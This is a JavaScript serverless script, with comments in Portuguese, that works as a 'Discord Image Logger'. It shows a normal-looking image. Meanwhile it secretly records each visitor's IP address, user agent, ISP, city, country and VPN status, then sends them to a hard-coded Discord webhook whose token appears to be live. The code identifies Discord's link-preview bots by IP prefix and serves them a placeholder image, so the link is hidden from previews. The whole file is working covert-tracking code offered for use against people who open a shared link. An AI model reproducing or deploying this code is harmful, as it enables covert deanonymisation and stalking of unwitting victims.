// Discord Image Logger para Vercel
// Versão simplificada

const https = require('https');
const { Buffer } = require('buffer');
const url = require('url');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "username": "Image Logger",
  "color": 0x00FFFF,
  "buggedImage": true
};

// Imagem de carregamento em base64
const loadingImageBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

// Função para enviar webhook ao Discord
async function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    const webhookUrl = new URL(config.webhook);
    
    const options = {
      hostname: webhookUrl.hostname,
      path: webhookUrl.pathname + webhookUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    };
    
    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => { responseData += chunk; });
      res.on('end', () => { resolve(responseData); });
    });
    
    req.on('error', (error) => { reject(error); });
    req.write(JSON.stringify(data));
    req.end();
  });
}

// Função para obter informações de IP
async function getIpInfo(ip) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'ip-api.com',
      path: `/json/${ip}?fields=16976857`,
      method: 'GET'
    };
    
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    });
    
    req.on('error', (error) => { reject(error); });
    req.end();
  });
}

// Função para registrar o IP
async function logIP(ip, userAgent, path, imageUrl) {
  try {
    // Verificar se é um bot do Discord
    if (ip && (ip.startsWith('34') || ip.startsWith('35'))) {
      await sendDiscordWebhook({
        username: config.username,
        embeds: [{
          title: "Image Logger - Link Sent",
          color: config.color,
          description: `An **Image Logging** link was sent in a chat!\n**IP:** \`${ip}\`\n**Platform:** Discord`
        }]
      });
      return true;
    }
    
    // Obter informações do IP
    const ipInfo = await getIpInfo(ip);
    
    // Detectar navegador e sistema operacional
    let browser = "Unknown", os = "Unknown";
    if (userAgent) {
      if (userAgent.includes("Firefox")) browser = "Firefox";
      else if (userAgent.includes("Chrome")) browser = "Chrome";
      else if (userAgent.includes("Safari")) browser = "Safari";
      else if (userAgent.includes("Edge")) browser = "Edge";
      
      if (userAgent.includes("Windows")) os = "Windows";
      else if (userAgent.includes("Mac")) os = "MacOS";
      else if (userAgent.includes("Linux")) os = "Linux";
      else if (userAgent.includes("Android")) os = "Android";
      else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
    }
    
    // Enviar webhook para o Discord
    await sendDiscordWebhook({
      username: config.username,
      content: "@everyone",
      embeds: [{
        title: "Image Logger - IP Logged",
        color: config.color,
        description: `**A User Opened the Original Image!**

**IP Info:**
> **IP:** \`${ip}\`
> **Provider:** \`${ipInfo?.isp || 'Unknown'}\`
> **Country:** \`${ipInfo?.country || 'Unknown'}\`
> **City:** \`${ipInfo?.city || 'Unknown'}\`
> **VPN:** \`${ipInfo?.proxy ? 'Yes' : 'No'}\`

**PC Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``,
        thumbnail: imageUrl ? { url: imageUrl } : undefined
      }]
    });
    
    return true;
  } catch (error) {
    console.error("Error logging IP:", error);
    return false;
  }
}

// Handler principal
module.exports = async (req, res) => {
  try {
    // Obter IP, user agent e caminho
    const ip = req.headers['x-forwarded-for'] || 
              req.headers['x-real-ip'] || 
              req.socket.remoteAddress || 
              'Unknown';
    const userAgent = req.headers['user-agent'] || '';
    const path = req.url || '/';
    
    // Analisar URL para obter parâmetros
    const parsedUrl = url.parse(path, true);
    const query = parsedUrl.query;
    
    // Definir imagem
    let imageUrl = config.image;
    if (query.url) {
      try {
        imageUrl = Buffer.from(query.url, 'base64').toString('utf-8');
      } catch (e) {}
    }
    
    // Verificar se é bot do Discord
    const isDiscordBot = ip.startsWith('34') || ip.startsWith('35');
    if (isDiscordBot && config.buggedImage) {
      // Registrar visita
      await logIP(ip, userAgent, path, imageUrl);
      
      // Enviar imagem bugada
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from(loadingImageBase64, 'base64'));
      return;
    }
    
    // Registrar visita de forma assíncrona
    logIP(ip, userAgent, path, imageUrl).catch(console.error);
    
    // Retornar HTML com a imagem
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Image</title>
        <style>
          body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
          }
          .fullscreen-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0;
            left: 0;
          }
        </style>
      </head>
      <body>
        <img src="${imageUrl}" class="fullscreen-img" alt="Image">
      </body>
      </html>
    `;
    
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
  } catch (error) {
    console.error("Error:", error);
    
    // Em caso de erro, exibir imagem padrão
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <title>Image</title>
        <style>
          body { margin: 0; padding: 0; }
          img { max-width: 100%; height: auto; }
        </style>
      </head>
      <body>
        <img src="${config.image}" alt="Image">
      </body>
      </html>
    `;
    
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
  }
};
